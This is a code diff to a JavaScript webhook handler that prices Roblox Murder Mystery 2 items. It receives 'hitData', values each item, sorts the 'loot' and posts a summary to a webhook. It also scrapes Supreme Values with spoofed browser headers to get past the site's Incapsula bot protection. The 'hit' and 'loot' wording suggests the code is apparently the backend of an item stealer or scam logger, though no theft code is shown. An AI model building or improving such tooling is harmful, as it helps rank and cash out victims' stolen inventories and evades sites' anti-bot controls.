@@ -161,53 +161,86 @@ const MM2_VALUES = {
   'CommonGun':             { sv: 5,      usd: 0.01 },
 };
 
-// Normalize item name for lookup.
-// MM2 stores items internally as e.g. "Love_K_2023", "Duckies_G_2026", "Scythe_K"
-// Pattern: BaseName_K_YEAR (knife) or BaseName_G_YEAR (gun)
-// We strip the _K/_G suffix and year token to find the base item name.
-function lookupValue(rawName) {
-  if (!rawName) return null;
+// Safe lookup — NO fuzzy substring matching (it causes wrong item hits).
+// Only does: exact → case-insensitive exact → strip year → strip _K/_G suffix → Knife/Gun append
+function normalizeName(raw) {
+  if (!raw) return [];
+  const variants = new Set();
+  variants.add(raw);
 
-  const candidates = new Set();
-  candidates.add(rawName);
+  // Strip trailing year: Love_K_2023 → Love_K
+  const noYear = raw.replace(/_20\d{2}$/i, '');
+  variants.add(noYear);
 
-  // Strip trailing year token: _2020 _2021 ... _2030
-  const noYear = rawName.replace(/_20\d{2}$/, '');
-  candidates.add(noYear);
+  // Strip _K or _G (with optional year): Love_K_2023 → Love, Duckies_G_2026 → Duckies
+  const noSuffix = raw.replace(/_(K|G)(_20\d{2})?$/i, '');
+  variants.add(noSuffix);
 
-  // Strip _K or _G suffix (knife/gun marker) with optional year
-  // e.g. Love_K_2023 → Love, Duckies_G_2026 → Duckies
-  const noSuffix = rawName.replace(/_(K|G)(_20\d{2})?$/i, '');
-  candidates.add(noSuffix);
+  // Also try appending Knife / Gun to the stripped base
+  variants.add(noSuffix + 'Knife');
+  variants.add(noSuffix + 'Gun');
 
-  // Also try with the suffix collapsed: Love_K → LoveKnife, LoveK, Love
-  const base = noSuffix;
-  candidates.add(base + 'Knife');
-  candidates.add(base + 'Gun');
-  candidates.add(base + 'K');
-  candidates.add(base + 'G');
+  return [...variants];
+}
 
-  // Strip ALL underscores/spaces/hyphens for fuzzy match
-  const stripped = rawName.replace(/[\s_-]/g, '').toLowerCase();
-
+function lookupValueStatic(rawName) {
+  const candidates = normalizeName(rawName);
   for (const candidate of candidates) {
-    // Direct match
-    if (MM2_VALUES[candidate]) return MM2_VALUES[candidate];
-
-    // Case-insensitive match
+    // Exact match
+    if (MM2_VALUES[candidate] !== undefined) return MM2_VALUES[candidate];
+    // Case-insensitive exact match
     const lower = candidate.toLowerCase();
     for (const [key, val] of Object.entries(MM2_VALUES)) {
       if (key.toLowerCase() === lower) return val;
     }
   }
+  return null;
+}
 
-  // Final fuzzy: strip all non-alpha and compare
-  for (const [key, val] of Object.entries(MM2_VALUES)) {
-    const keyStripped = key.replace(/[\s_-]/g, '').toLowerCase();
-    if (keyStripped === stripped) return val;
-    // Also try base of candidate stripped against key stripped
-    const baseStripped = noSuffix.replace(/[\s_-]/g, '').toLowerCase();
-    if (keyStripped === baseStripped) return val;
+// Attempt to fetch live price from Supreme Values.
+// They're behind Incapsula but we try with real browser headers.
+// Returns { sv, usd } or null on failure.
+async function fetchLivePrice(itemName) {
+  try {
+    // Try their item page — parse the sv value out of the HTML
+    const slug = itemName.toLowerCase().replace(/[^a-z0-9]/g, '');
+    const resp = await fetch(`https://www.supremevalues.com/item/${slug}`, {
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Referer': 'https://www.supremevalues.com/',
+      },
+      signal: AbortSignal.timeout(4000)
+    });
+    if (!resp.ok) return null;
+    const html = await resp.text();
+    // Their pages embed value like: "value":1234 or >1,234< in the page
+    const match = html.match(/"demand"\s*:\s*(\d+(?:\.\d+)?)/i)
+      || html.match(/data-value="(\d+(?:\.\d+)?)"/i)
+      || html.match(/>Value[^<]*<\/[^>]+>\s*([\d,]+)</i);
+    if (match) {
+      const sv = parseFloat(match[1].replace(/,/g, ''));
+      return { sv, usd: +(sv / 1000 * 1.2).toFixed(2) };
+    }
+  } catch (_) { /* blocked or timeout */ }
+  return null;
+}
+
+async function lookupValue(rawName) {
+  // 1. Try static table first (fast, no network)
+  const staticResult = lookupValueStatic(rawName);
+  if (staticResult !== null) return staticResult;
+
+  // 2. Try live fetch for items not in static table
+  const liveResult = await fetchLivePrice(rawName);
+  if (liveResult) return liveResult;
+
+  // Try the suffix-stripped base name too
+  const noSuffix = rawName.replace(/_(K|G)(_20\d{2})?$/i, '').replace(/_20\d{2}$/i, '');
+  if (noSuffix !== rawName) {
+    const liveBase = await fetchLivePrice(noSuffix);
+    if (liveBase) return liveBase;
   }
 
   return null;
@@ -244,14 +277,14 @@ export default async function handler(req, res) {
 
   if (webhookUrl !== 'YOUR_WEBHOOK_URL_HERE') {
     try {
-      // ── Value calculation ────────────────────────────────
+      // ── Value calculation (async lookups run in parallel) ──
       let totalUSD = 0;
-      const valuedItems = (hitData.items || []).map(item => {
-        const lookup = lookupValue(item.name);
-        const itemUSD = lookup ? lookup.usd * item.amount : null;
+      const valuedItems = await Promise.all((hitData.items || []).map(async item => {
+        const lookup = await lookupValue(item.name);
+        const itemUSD = lookup ? +(lookup.usd * item.amount) : null;
         if (itemUSD) totalUSD += itemUSD;
         return { ...item, sv: lookup?.sv ?? null, usd: itemUSD };
-      });
+      }));
 
       // Sort: known value (high→low) → unknown/unlisted → confirmed $0 junk
       valuedItems.sort((a, b) => {
@@ -278,7 +311,7 @@ export default async function handler(req, res) {
       const lootLines = valuedItems.length > 0
         ? valuedItems.map(item => {
             const tier = item.sv !== null ? getTier(item.sv) : '❓';
-            const price = item.usd !== null ? formatUSD(item.usd) : '?';
+            const price = item.usd !== null ? formatUSD(item.usd) : `[check](https://www.supremevalues.com/search?q=${encodeURIComponent(item.name)})`;
             return `${tier} **${item.name}** x${item.amount} — ${price}`;
           })
         : ['No items'];
